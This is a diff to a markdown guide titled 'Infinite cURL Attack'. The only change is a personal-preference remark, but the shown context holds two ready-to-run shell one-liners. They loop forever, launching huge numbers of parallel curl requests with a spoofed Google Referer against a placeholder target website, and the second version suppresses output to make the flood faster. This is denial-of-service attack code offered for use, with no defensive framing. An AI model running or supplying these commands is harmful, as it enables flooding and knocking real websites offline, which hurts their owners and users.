@@ -9,7 +9,7 @@ Infinite cURL Attack
 while (true); do seq 1 1000000000 | xargs -n1 -P 1000000000 curl -I -i -v -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com"; done;
 ```  
 
-If you don't want logs in your terminal and make the attacks faster, do this:  
+If you don't want logs in your terminal and make the attacks faster, do this (**the following is my preference**):  
 
 ```
 while (true); do seq 1 1000000000 | xargs -n1 -P 1000000000 curl -s -H "Connection: keep-alive" -H "Referer: https://google.com" "https://Your.Target.Website.com" > /dev/null; done;
